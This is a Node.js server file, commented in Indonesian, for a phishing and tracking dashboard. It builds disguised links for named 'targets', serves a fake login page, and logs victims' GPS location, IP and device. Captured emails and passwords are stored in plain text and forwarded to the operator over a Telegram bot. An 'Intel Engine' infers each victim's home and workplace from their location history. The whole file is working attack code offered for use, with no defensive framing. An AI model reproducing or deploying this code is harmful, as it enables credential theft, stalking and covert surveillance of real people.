// File: server.js (v7.3 - Final with Intel Engine)

require('dotenv').config();

const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const UAParser = require('ua-parser-js');
const { nanoid } = require('nanoid');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const db = require('./db');
const requestIp = require('request-ip');
const axios = require('axios');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cheerio = require('cheerio');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });
const PORT = process.env.PORT || 4000;
const JWT_SECRET = process.env.JWT_SECRET || 'gantidengankatayangsan6atrahas14';

app.use(cors());
app.use(express.json());
app.use(requestIp.mw());
app.use(express.static(__dirname));

const protectRoute = (req, res, next) => {
    try {
        const token = req.headers.authorization?.split(" ")[1];
        if (!token) { return res.status(401).json({ message: 'Akses ditolak. Token tidak ada.' }); }
        jwt.verify(token, JWT_SECRET, (err, decoded) => {
            if (err) { return res.status(401).json({ message: 'Token tidak valid.' }); }
            req.user = decoded;
            next();
        });
    } catch (error) { res.status(401).json({ message: 'Token tidak valid atau error.' }); }
};

const sendTelegramNotification = async (locationData) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!botToken || !chatId) {
        console.warn('⚠️ Variabel Telegram Bot (TOKEN/CHAT_ID) tidak diatur di .env, notifikasi lokasi dilewati.');
        return;
    }
    const { username, ip_address, city, country, isp, org, proxy, browserInfo, osInfo, latitude, longitude } = locationData;
    const message = `
*💀 Target Terdeteksi! 💀*

*Target ID:* \`${username}\`
*IP Address:* \`${ip_address}\`
*Lokasi:* ${city || 'N/A'}, ${country || 'N/A'}
*Provider:* ${isp || 'N/A'} (${org || 'N/A'})
*Proxy/VPN:* ${proxy ? 'Ya' : 'Tidak'}

*Perangkat:* ${browserInfo} pada ${osInfo}

*Lihat di Peta:*
[Google Maps](http://googleusercontent.com/maps/google.com/9{latitude},${longitude})
    `;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
        await axios.post(url, { chat_id: chatId, text: message, parse_mode: 'Markdown' });
        console.log('✅ Notifikasi Lokasi Telegram berhasil dikirim.');
    } catch (error) {
        console.error('❌ Gagal mengirim notifikasi Lokasi Telegram:', error.response ? error.response.data : error.message);
    }
};

const sendCredentialsNotification = async (credData) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!botToken || !chatId) {
        console.warn('⚠️ Variabel Telegram Bot tidak diatur, notifikasi kredensial dilewati.');
        return;
    }
    const { username, trackerId, ipAddress, email, password } = credData;
    const message = `
*🔒 Credentials Captured! 🔒*

*Target ID:* \`${username}\`
*Link ID:* \`${trackerId}\`
*IP Address:* \`${ipAddress}\`

*--- CAPTURED DATA ---*
*Email:* \`${email}\`
*Password:* \`${password}\`
    `;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
        await axios.post(url, { chat_id: chatId, text: message, parse_mode: 'Markdown' });
        console.log('✅ Notifikasi Kredensial Telegram berhasil dikirim.');
    } catch (error) {
        console.error('❌ Gagal mengirim notifikasi Kredensial Telegram:', error.response ? error.response.data : error.message);
    }
};

const broadcastDashboardUpdate = async (socket = null) => {
    try {
        const linksQuery = `
            SELECT 
                l.id, l.original_url, l.created_at, l.expires_at, l.link_type, 
                u.username, l.click_count, l.last_clicked_at, 
                last_loc.city, last_loc.country 
            FROM links l 
            JOIN users u ON l.user_id = u.id 
            LEFT JOIN (
                SELECT tracker_id, city, country, ROW_NUMBER() OVER (PARTITION BY tracker_id ORDER BY created_at DESC) as rn 
                FROM locations
            ) AS last_loc ON l.id = last_loc.tracker_id AND last_loc.rn = 1 
            ORDER BY l.created_at DESC`;
        const [links] = await db.promise().query(linksQuery);
        const statsQuery = `
            SELECT 
                (SELECT COUNT(*) FROM links) as total_links, 
                (SELECT SUM(click_count) FROM links) as total_clicks, 
                (SELECT COUNT(*) FROM locations) as total_locations`;
        const [stats] = await db.promise().query(statsQuery);
        const [locations] = await db.promise().query(`SELECT user_agent FROM locations`);
        const parser = new UAParser();
        const browserStats = locations.reduce((acc, loc) => {
            if (loc.user_agent) {
                const browserName = parser.setUA(loc.user_agent).getBrowser().name || "Unknown";
                acc[browserName] = (acc[browserName] || 0) + 1;
            }
            return acc;
        }, {});
        const credentialsQuery = `
            SELECT 
                c.id, c.tracker_id, c.email, c.password, c.ip_address, c.created_at, 
                u.username, 
                l.click_count, l.expires_at 
            FROM credentials c 
            JOIN links l ON c.tracker_id = l.id 
            JOIN users u ON l.user_id = u.id 
            ORDER BY c.created_at DESC`;
        const [credentials] = await db.promise().query(credentialsQuery);
        const data = { links, stats: stats[0], browserStats, credentials };
        const emitter = socket || io;
        emitter.emit('dashboard_update', data);
    } catch (error) {
        console.error("❌ Gagal broadcast update:", error);
    }
};

const broadcastLogMessage = (message) => {
    const timestamp = new Date().toLocaleTimeString('id-ID');
    io.emit('new_log_message', `[${timestamp}] ${message}`);
};

io.on('connection', (socket) => {
    console.log('🔌 Klien baru terhubung via WebSocket');
    socket.on('request_initial_data', (payload) => {
        try {
            const token = payload.token;
            if (!token) return;
            jwt.verify(token, JWT_SECRET, (err, decoded) => {
                if (err) {
                    console.log('🔒 Token tidak valid dari klien soket.');
                    return;
                }
                console.log(`✅ Klien terotentikasi (${decoded.username}), mengirim data awal.`);
                broadcastDashboardUpdate(socket);
            });
        } catch (error) {
            console.error('Error pada event request_initial_data:', error);
        }
    });
    socket.on('disconnect', () => {
        console.log('🔌 Klien terputus');
    });
});

app.get('/', (req, res) => {
    res.redirect('/login.html');
});

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    try {
        const [users] = await db.promise().query('SELECT * FROM users WHERE username = ? AND is_admin = TRUE', [username]);
        if (users.length === 0) {
            return res.status(401).json({ message: 'Username atau password salah.' });
        }
        const admin = users[0];
        const isMatch = await bcrypt.compare(password, admin.password);
        if (!isMatch) {
            return res.status(401).json({ message: 'Username atau password salah.' });
        }
        const token = jwt.sign({ userId: admin.id, username: admin.username }, JWT_SECRET, { expiresIn: '8h' });
        res.json({ message: 'Login berhasil!', token });
    } catch (error) {
        console.error("Error saat login:", error);
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/:id', async (req, res) => {
    const { id } = req.params;
    
    try {
        const [links] = await db.promise().query(`SELECT l.*, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
        
        if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
        
        const linkData = links[0];
        
        if (linkData.expires_at && new Date(linkData.expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
        
        let destinationUrl = linkData.original_url;

        io.emit('link_clicked', { username: linkData.username });

        let templatePath = '';
        if (linkData.link_type === 'direct') templatePath = 'tracker.html';
        else if (linkData.link_type === 'intermediate') templatePath = 'login_users.html';
        else if (linkData.link_type === 'iframe') templatePath = 'iframe_page.html';
        else return res.redirect(destinationUrl);

        fs.readFile(path.join(__dirname, templatePath), 'utf8', (fsErr, data) => {
            if (fsErr) return res.status(500).send('Server error');

            let ogTags = '';
            if (linkData.og_title) ogTags += `<meta property="og:title" content="${linkData.og_title.replace(/"/g, '"')}">\n`;
            if (linkData.og_description) ogTags += `<meta property="og:description" content="${linkData.og_description.replace(/"/g, '"')}">\n`;
            if (linkData.og_image) ogTags += `<meta property="og:image" content="${linkData.og_image}">\n`;

            let html = data.replace('</head>', ogTags + '</head>');
            
            html = html.replace(/{{DESTINATION_URL}}/g, destinationUrl)
                       .replace(/{{TRACKER_ID}}/g, id)
                       .replace(/{{USERNAME}}/g, linkData.username);
            
            if (linkData.link_type === 'iframe') {
                let pageTitle = linkData.og_title || 'Loading...';
                html = html.replace(/{{PAGE_TITLE}}/g, pageTitle);
            }

            res.send(html);
        });

    } catch (error) {
        console.error("Error handling link click:", error);
        res.status(500).send('Server error');
    }
});

app.post('/log', async (req, res) => {
    const { latitude, longitude, trackerId, username } = req.body;
    const userAgentString = req.headers['user-agent'];
    const ipAddress = req.clientIp;
    try {
        const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
        if (users.length === 0) return res.status(404).json({ status: 'error', message: 'User not found' });
        
        let country = null, city = null, isp = null, org = null, proxy = false;
        try {
            const apiKey = process.env.OPENCAGE_API_KEY;
            if (apiKey && latitude && longitude) {
                const geoUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}&language=id&pretty=1`;
                const geoResponse = await axios.get(geoUrl);
                const components = geoResponse.data.results[0]?.components;
                if (components) {
                    country = components.country;
                    city = components.city || components.town || components.village || components.state_district;
                }
            }
            const ipUrl = `http://ip-api.com/json/${ipAddress}?fields=status,message,isp,org,proxy`;
            const ipResponse = await axios.get(ipUrl);
            if (ipResponse.data.status === 'success') {
                isp = ipResponse.data.isp;
                org = ipResponse.data.org;
                proxy = ipResponse.data.proxy;
            }
        } catch (apiError) {
            console.error("❌ Gagal memanggil API eksternal:", apiError.message);
        }
        
        const newLocation = { user_id: users[0].id, tracker_id: trackerId, latitude, longitude, ip_address: ipAddress, user_agent: userAgentString, country, city, isp, org, proxy };
        await db.promise().query('INSERT INTO locations SET ?', newLocation);

        await db.promise().query("UPDATE links SET click_count = click_count + 1, last_clicked_at = NOW() WHERE id = ?", [trackerId]);
        
        const parser = new UAParser(userAgentString);
        const ua = parser.getResult();
        const browserInfo = ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown';
        const osInfo = ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown';
        const locationInfo = city ? `from ${city}, ${country}` : '';
        
        broadcastLogMessage(`> Location ${locationInfo} from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
        console.log(`📍 Lokasi diterima dari: ${username} [${ipAddress}] - ${city || 'Unknown City'}, ${country || 'Unknown Country'}`);

        const notificationData = { ...newLocation, username, browserInfo, osInfo };
        await sendTelegramNotification(notificationData);

        const newLocationDataForMap = { ...newLocation, username, created_at: new Date() };
        io.emit('new_location_logged', newLocationDataForMap);
        
        broadcastDashboardUpdate();
        res.json({ status: 'success' });
    } catch (error) {
        console.error("Error logging location:", error);
        res.status(500).json({ status: 'error' });
    }
});

app.post('/api/credentials', async (req, res) => {
    const { email, password, trackerId } = req.body;
    const ipAddress = req.clientIp;
    
    console.log(`🔒 Kredensial ditangkap! Email: ${email}, Password: ${password}, Link ID: ${trackerId}, IP: ${ipAddress}`);
    broadcastLogMessage(`> Kredensial ditangkap dari link [${trackerId}] | Email: ${email} | IP: ${ipAddress}`);
    
    try {
        await db.promise().query('INSERT INTO credentials (tracker_id, email, password, ip_address) VALUES (?, ?, ?, ?)', [trackerId, email, password, ipAddress]);
        
        const [rows] = await db.promise().query('SELECT u.username FROM users u JOIN links l ON u.id = l.user_id WHERE l.id = ?', [trackerId]);
        
        if (rows.length > 0) {
            const username = rows[0].username;
            await sendCredentialsNotification({ username, trackerId, ipAddress, email, password });
        }

        res.status(200).json({ message: 'Credentials logged successfully.' });
        broadcastDashboardUpdate();
    } catch (error) {
        console.error('❌ Gagal menyimpan kredensial:', error);
        res.status(500).json({ message: 'Error saving credentials.' });
    }
});

app.post('/create', protectRoute, async (req, res) => {
    const { username, originalUrl, url_android, url_ios, expiresIn, linkType } = req.body;
    
    if (!username || !originalUrl) return res.status(400).json({ error: 'Data tidak lengkap' });
    
    let ogData = { og_title: null, og_description: null, og_image: null };
    try {
        const response = await axios.get(originalUrl, { headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' } });
        const html = response.data;
        const $ = cheerio.load(html);

        ogData.og_title = $('meta[property="og:title"]').attr('content') || $('title').text() || null;
        ogData.og_description = $('meta[property="og:description"]').attr('content') || $('meta[name="description"]').attr('content') || null;
        ogData.og_image = $('meta[property="og:image"]').attr('content') || null;

        if (ogData.og_image && ogData.og_image.startsWith('/')) {
            const { protocol, host } = new URL(originalUrl);
            ogData.og_image = `${protocol}//${host}${ogData.og_image}`;
        }
    } catch (error) {
        console.warn(`⚠️ Gagal mengambil OG data dari ${originalUrl}: ${error.message}`);
    }

    let expiresAt = null;
    if (expiresIn && !isNaN(parseInt(expiresIn))) {
        expiresAt = new Date();
        expiresAt.setHours(expiresAt.getHours() + parseInt(expiresIn));
    }

    try {
        let [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
        let userId;
        if (users.length > 0) {
            userId = users[0].id;
        } else {
            const [result] = await db.promise().query('INSERT INTO users (username, is_admin) VALUES (?, FALSE) ON DUPLICATE KEY UPDATE id=LAST_INSERT_ID(id)', [username]);
            userId = result.insertId;
        }

        const id = nanoid(8);
        const newLinkData = { 
            id, 
            user_id: userId, 
            original_url: originalUrl, 
            url_android: url_android || null, 
            url_ios: url_ios || null, 
            expires_at: expiresAt, 
            link_type: linkType || 'direct',
            ...ogData
        };

        await db.promise().query('INSERT INTO links SET ?', newLinkData);
        
        broadcastLogMessage(`> Link created for target [${username}] with ID [${id}]`);
        broadcastDashboardUpdate();
        res.status(201).json({ newLink: `${req.protocol}://${req.get('host')}/${id}`, username });
    } catch (error) {
        console.error("Error creating link:", error);
        res.status(500).json({ error: 'DB error' });
    }
});

app.delete('/api/links/:id', protectRoute, async (req, res) => {
    const { id } = req.params;
    try {
        await db.promise().query("DELETE FROM links WHERE id = ?", [id]);
        broadcastLogMessage(`> Link [${id}] has been deleted.`);
        broadcastDashboardUpdate();
        res.json({ status: 'success', message: 'Link berhasil dihapus.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: 'Gagal menghapus link.' });
    }
});

app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
    const { trackerId } = req.params;
    try {
        const [locations] = await db.promise().query(`SELECT latitude, longitude, created_at, ip_address, user_agent, country, city, isp, org, proxy FROM locations WHERE tracker_id = ? ORDER BY created_at DESC`, [trackerId]);
        const parser = new UAParser();
        const parsedLocations = locations.map(loc => {
            const ua = parser.setUA(loc.user_agent || '').getResult();
            const deviceType = ua.device.type || (ua.os.name === 'iOS' || ua.os.name === 'Android' ? 'mobile' : 'desktop');
            return { ...loc, browser: ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown', os: ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown', device: { type: deviceType, vendor: ua.device.vendor || 'Unknown', model: ua.device.model || 'N/A' } };
        });
        res.json(parsedLocations);
    } catch (error) {
        console.error(`❌ Gagal mengambil data lokasi untuk ${trackerId}:`, error);
        res.status(500).json({ error: 'DB error' });
    }
});

// ##### PENAMBAHAN FITUR INTEL ENGINE - MULAI #####

// Fungsi untuk menganalisis pola perilaku dari data lokasi
async function analyzeBehavioralPatterns(userId) {
    try {
        const [locations] = await db.promise().query(
            'SELECT latitude, longitude, created_at FROM locations WHERE user_id = ? ORDER BY created_at DESC',
            [userId]
        );

        if (locations.length < 10) { // Butuh data yang cukup untuk analisis
            return { home: null, work: null, anomalies: [], message: 'Insufficient location data for analysis.' };
        }

        // 1. Clustering Sederhana: Kelompokkan lokasi yang berdekatan
        const locationClusters = {};
        locations.forEach(loc => {
            // Bulatkan koordinat untuk mengelompokkan titik yang sangat dekat (presisi ~111 meter)
            const clusterId = `${loc.latitude.toFixed(3)},${loc.longitude.toFixed(3)}`;
            if (!locationClusters[clusterId]) {
                locationClusters[clusterId] = {
                    lat: loc.latitude,
                    lon: loc.longitude,
                    points: []
                };
            }
            locationClusters[clusterId].points.push(new Date(loc.created_at));
        });

        // Urutkan cluster berdasarkan jumlah titik (frekuensi kunjungan)
        const sortedClusters = Object.values(locationClusters).sort((a, b) => b.points.length - a.points.length);

        let potentialHome = null;
        let potentialWork = null;

        // 2. Analisis Waktu untuk setiap cluster teratas
        for (const cluster of sortedClusters.slice(0, 5)) { // Analisis 5 lokasi paling sering dikunjungi
            let homeScore = 0;
            let workScore = 0;

            cluster.points.forEach(date => {
                const day = date.getDay(); // 0 = Minggu, 6 = Sabtu
                const hour = date.getHours();

                // Cek jam "rumah" (20:00 - 07:00 atau akhir pekan)
                if (hour >= 20 || hour < 7 || day === 0 || day === 6) {
                    homeScore++;
                }

                // Cek jam "kantor" (Senin-Jumat, 09:00 - 17:00)
                if (day > 0 && day < 6 && hour >= 9 && hour <= 17) {
                    workScore++;
                }
            });

            // Tetapkan sebagai kandidat jika belum ada atau skornya lebih tinggi
            if (!potentialHome || homeScore > potentialHome.score) {
                if(workScore < homeScore) { // Pastikan tidak tumpang tindih dengan skor kerja
                    potentialHome = { lat: cluster.lat, lon: cluster.lon, count: cluster.points.length, score: homeScore, points: cluster.points };
                }
            }
            if (!potentialWork || workScore > potentialWork.score) {
                 if(homeScore < workScore) { // Pastikan tidak tumpang tindih dengan skor rumah
                    potentialWork = { lat: cluster.lat, lon: cluster.lon, count: cluster.points.length, score: workScore, points: cluster.points };
                }
            }
        }
        
        // Finalisasi: pastikan lokasi kerja dan rumah tidak sama persis
        if (potentialHome && potentialWork && potentialHome.lat === potentialWork.lat) {
            if (potentialHome.score > potentialWork.score) {
                potentialWork = null; // Prioritaskan sebagai rumah jika skor lebih tinggi
            } else {
                potentialHome = null; // Prioritaskan sebagai kerja
            }
        }


        // 3. Deteksi Anomali
        const anomalies = [];
        if (potentialWork) {
            potentialWork.points.forEach(date => {
                const day = date.getDay();
                const hour = date.getHours();
                if (day === 0 || day === 6 || hour > 20 || hour < 6) { // Jika ada di "kantor" di akhir pekan atau tengah malam
                    anomalies.push(`Anomaly Detected: Presence at [WORK] location on ${date.toLocaleString('id-ID')}.`);
                }
            });
        }

        return {
            home: potentialHome ? { lat: potentialHome.lat, lon: potentialHome.lon, count: potentialHome.count } : null,
            work: potentialWork ? { lat: potentialWork.lat, lon: potentialWork.lon, count: potentialWork.count } : null,
            anomalies: anomalies.slice(0, 5) // Batasi 5 anomali teratas
        };

    } catch (error) {
        console.error("Intel Engine Analysis Error:", error);
        throw error;
    }
}


// Endpoint baru untuk Intel Engine
app.get('/api/intel/:username', protectRoute, async (req, res) => {
    const { username } = req.params;
    try {
        const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
        if (users.length === 0) {
            return res.status(404).json({ error: 'Target user not found' });
        }
        const userId = users[0].id;

        console.log(`> Running Intel Engine analysis for [${username}]...`);
        broadcastLogMessage(`> Running Intel Engine analysis for [${username}]...`);

        const analysisResult = await analyzeBehavioralPatterns(userId);
        
        console.log(`> Analysis for [${username}] complete.`);
        broadcastLogMessage(`> Analysis for [${username}] complete.`);

        res.json(analysisResult);
    } catch (error) {
        res.status(500).json({ error: 'Server error during analysis' });
    }
});


// ##### PENAMBAHAN FITUR INTEL ENGINE - SELESAI #####


server.listen(PORT, () => {
    console.log(`\n HACKER-UI DASHBOARD v7.3 (Final with Intel Engine)`);
    console.log(`===================================================`);
    console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
});